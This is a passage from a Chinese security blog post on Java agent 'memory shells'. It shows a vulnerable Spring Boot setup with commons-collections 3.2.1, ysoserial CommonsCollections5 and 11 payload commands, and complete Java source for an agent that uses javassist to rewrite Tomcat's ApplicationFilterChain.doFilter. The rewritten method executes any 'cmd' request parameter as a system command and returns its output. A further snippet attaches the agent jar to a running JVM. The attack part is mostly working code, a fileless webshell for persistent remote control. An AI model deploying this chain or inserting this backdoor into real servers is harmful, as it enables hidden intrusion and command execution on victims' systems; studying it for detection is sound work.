+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.5.13&lt;/version&gt;</span><br><span class="line">    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">&lt;/parent&gt;        </span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>yso cc5直接打，传base64之后的payload需要再urlencode一次，因为浏览器对<code>+</code> 号的处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsCollections5 <span class="string">"open -a calculator"</span> | base64</span><br></pre></td></tr></table></figure>
+<p><a href="https://github.com/KpLi0rn/AgentMemShell" target="_blank" rel="noopener">https://github.com/KpLi0rn/AgentMemShell</a>，编写agent，直接劫持doFilter函数</p>
+<p>AgentMain.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ClassName = <span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> </span>&#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> DefineTransformer(),<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> Class[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>DefineTransformer.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ClassName = <span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">"/"</span>,<span class="string">"."</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">"Find the Inject Class: "</span> + ClassName);</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                CtClass c = pool.getCtClass(className);</span><br><span class="line">                CtMethod m = c.getDeclaredMethod(<span class="string">"doFilter"</span>);</span><br><span class="line">                m.insertBefore(<span class="string">"javax.servlet.http.HttpServletRequest req =  request;\n"</span> +</span><br><span class="line">                        <span class="string">"javax.servlet.http.HttpServletResponse res = response;\n"</span> +</span><br><span class="line">                        <span class="string">"java.lang.String cmd = request.getParameter(\"cmd\");\n"</span> +</span><br><span class="line">                        <span class="string">"if (cmd != null)&#123;\n"</span> +</span><br><span class="line">                        <span class="string">"    try &#123;\n"</span> +</span><br><span class="line">                        <span class="string">"        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n"</span> +</span><br><span class="line">                        <span class="string">"        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n"</span> +</span><br><span class="line">                        <span class="string">"        String line;\n"</span> +</span><br><span class="line">                        <span class="string">"        StringBuilder sb = new StringBuilder(\"\");\n"</span> +</span><br><span class="line">                        <span class="string">"        while ((line=reader.readLine()) != null)&#123;\n"</span> +</span><br><span class="line">                        <span class="string">"            sb.append(line).append(\"\\n\");\n"</span> +</span><br><span class="line">                        <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                        <span class="string">"        response.getOutputStream().print(sb.toString());\n"</span> +</span><br><span class="line">                        <span class="string">"        response.getOutputStream().flush();\n"</span> +</span><br><span class="line">                        <span class="string">"        response.getOutputStream().close();\n"</span> +</span><br><span class="line">                        <span class="string">"    &#125; catch (Exception e)&#123;\n"</span> +</span><br><span class="line">                        <span class="string">"        e.printStackTrace();\n"</span> +</span><br><span class="line">                        <span class="string">"    &#125;\n"</span> +</span><br><span class="line">                        <span class="string">"&#125;"</span>);</span><br><span class="line">                <span class="keyword">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>打包成jar文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn assembly:assembly</span><br></pre></td></tr></table></figure>
+<p>使用自定义代码的ysoserial注入agent，<a href="https://github.com/KpLi0rn/ysoserial" target="_blank" rel="noopener">https://github.com/KpLi0rn/ysoserial</a></p>
+<p>agent.java</p>
+<p>由于 tools.jar 并不会在 JVM 启动的时候默认加载，所以这里利用 URLClassloader 来加载我们的 tools.jar</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    java.lang.String path = <span class="string">"/Users/str3am/Downloads/AgentMemShell/target/AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar"</span>;</span><br><span class="line">    java.io.File toolsPath = <span class="keyword">new</span> java.io.File(System.getProperty(<span class="string">"java.home"</span>).replace(<span class="string">"jre"</span>,<span class="string">"lib"</span>) + java.io.File.separator + <span class="string">"tools.jar"</span>);</span><br><span class="line">    java.net.URL url = toolsPath.toURI().toURL();</span><br><span class="line">    java.net.URLClassLoader classLoader = <span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;url&#125;);</span><br><span class="line">    Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="string">"com.sun.tools.attach.VirtualMachine"</span>);</span><br><span class="line">    Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">"com.sun.tools.attach.VirtualMachineDescriptor"</span>);</span><br><span class="line">    java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod(<span class="string">"list"</span>,<span class="keyword">null</span>);</span><br><span class="line">    java.util.List<span class="comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"Running JVM list ..."</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">        Object o = list.get(i);</span><br><span class="line">        java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">"displayName"</span>,<span class="keyword">null</span>);</span><br><span class="line">        java.lang.String name = (java.lang.String) displayName.invoke(o,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 列出当前有哪些 JVM 进程在运行 </span></span><br><span class="line">        <span class="comment">// 这里的 if 条件根据实际情况进行更改</span></span><br><span class="line">        <span class="keyword">if</span> (name.contains(<span class="string">"com.example.agentmemoryshell.AgentMemoryShellApplication"</span>))&#123;</span><br><span class="line">            <span class="comment">// 获取对应进程的 pid 号</span></span><br><span class="line">            java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">"id"</span>,<span class="keyword">null</span>);</span><br><span class="line">            java.lang.String id = (java.lang.String) getId.invoke(o,<span class="keyword">null</span>);</span><br><span class="line">            System.out.println(<span class="string">"id &gt;&gt;&gt; "</span> + id);</span><br><span class="line">            java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(<span class="string">"attach"</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            java.lang.Object vm = attach.invoke(o,<span class="keyword">new</span> Object[]&#123;id&#125;);</span><br><span class="line">            java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod(<span class="string">"loadAgent"</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            loadAgent.invoke(vm,<span class="keyword">new</span> Object[]&#123;path&#125;);</span><br><span class="line">            java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(<span class="string">"detach"</span>,<span class="keyword">null</span>);</span><br><span class="line">            detach.invoke(vm,<span class="keyword">null</span>);</span><br><span class="line">            System.out.println(<span class="string">"Agent.jar Inject Success !!"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>生成yso payload打过去即可，注意这里选择CommonsCollections11</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsCollections11 codefile:./agent.java | base64</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/26/Java-10/96tVzJzR83kkeNYB5OU-SnIdFGHcbh0D-6DKok0OmhU.png" alt="image"></p>
+<h2 id="Refferences"><a href="#Refferences" class="headerlink" title="Refferences"></a>Refferences</h2><ul>
+<li><a href="https://www.freebuf.com/articles/web/172753.html" target="_blank" rel="noopener">利用“进程注入”实现无文件复活 WebShell</a></li>
+<li><a href="http://wjlshare.com/archives/1582" target="_blank" rel="noopener">浅谈 Java Agent 内存马 – 天下大木头</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2022/05/26/Java-10/" title="Agent Memory Shell">https://jlkl.github.io/2022/05/26/Java-10/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/26/Java-09/" rel="prev" title="Spring Memory Shell">
+      <i class="fa fa-chevron-left"></i> Spring Memory Shell
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-Agent"><span class="nav-number">1.</span> <span class="nav-text">Java Agent</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启动时加载-agent"><span class="nav-number">1.1.</span> <span class="nav-text">启动时加载 agent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态修改字节码"><span class="nav-number">1.2.</span> <span class="nav-text">动态修改字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Instrumentation"><span class="nav-number">1.2.1.</span> <span class="nav-text">Instrumentation</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#addTransformer"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">addTransformer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getAllLoadedClasses"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">getAllLoadedClasses</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#retransformClasses"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">retransformClasses</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动后加载agent"><span class="nav-number">1.3.</span> <span class="nav-text">启动后加载agent</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Agent-Memory-Shell"><span class="nav-number">2.</span> <span class="nav-text">Agent Memory Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Refferences"><span class="nav-number">3.</span> <span class="nav-text">Refferences</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.siriyang.cn/" title="https:&#x2F;&#x2F;blog.siriyang.cn&#x2F;" rel="noopener" target="_blank">Siriyang</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">401k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
